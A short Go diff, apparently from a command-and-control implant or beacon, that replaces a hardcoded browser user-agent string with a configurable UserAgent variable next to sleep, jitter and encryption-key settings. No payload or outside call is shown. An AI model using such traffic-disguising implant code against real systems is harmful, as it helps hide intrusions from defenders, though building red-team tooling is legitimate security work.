@@ -21,6 +21,7 @@ var (
 	Sleep         = uint32(2)
 	Jitter        = uint8(10)
 	EncryptionKey = ""
+	UserAgent     = ""
 )
 
 func main() {
@@ -37,7 +38,7 @@ func main() {
 		ServerURL: ServerURL,
 		Sleep:     Sleep,
 		Jitter:    Jitter,
-		UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+		UserAgent: UserAgent,
 	}
 	tasks.Config.Sleep = &cfg.Sleep
 	tasks.Config.Jitter = &cfg.Jitter
